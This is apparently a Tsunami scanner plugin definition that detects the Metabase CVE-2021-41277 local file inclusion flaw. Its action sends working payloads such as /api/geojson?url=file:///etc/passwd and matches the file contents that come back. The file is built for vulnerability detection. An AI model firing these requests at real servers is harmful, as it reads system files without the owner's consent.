# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "Metabase_CVE_2021_41277"
  author: "Google"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "TSUNAMI_COMMUNITY"
    value: "CVE_2021_41277"
  }
  severity: CRITICAL
  title: "Metabase CVE-2021-41277 Local File Inclusion Vulnerability"
  description:
    "Metabase is an open source data analytics platform. In versions prior to 0.40.5 and 1.40.5, a"
    " security vulnerability in the custom GeoJSON map support (/api/geojson?url=) fails to validate"
    " URL schemes before loading. Unauthenticated remote attackers can supply file:// URLs (such as"
    " file:///etc/passwd or file:///c:/windows/win.ini) to read arbitrary local system files and"
    " environment variables."
  recommendation: "Upgrade Metabase to version 0.40.5, 1.40.5, or later."
  related_id: {
    publisher: "CVE"
    value: "CVE-2021-41277"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "verify_geojson_file_inclusion"
  http_request: {
    method: GET
    uri: [
      "/api/geojson?url=file:///etc/passwd",
      "/api/geojson?url=file:///c:/windows/win.ini",
      "/api/geojson?url=file:///etc/hosts"
    ]
    client_options: {
      disable_follow_redirects: true
    }
    response: {
      http_status: 200
      expect_any: {
        conditions: [
          { body: {} contains: "root:x:0:0:" },
          { body: {} contains: "root:*:0:0:" },
          { body: {} contains: "; for 16-bit app support" },
          { body: {} contains: "127.0.0.1\tlocalhost" },
          { body: {} contains: "127.0.0.1 localhost" }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  actions: [
    "verify_geojson_file_inclusion"
  ]
}
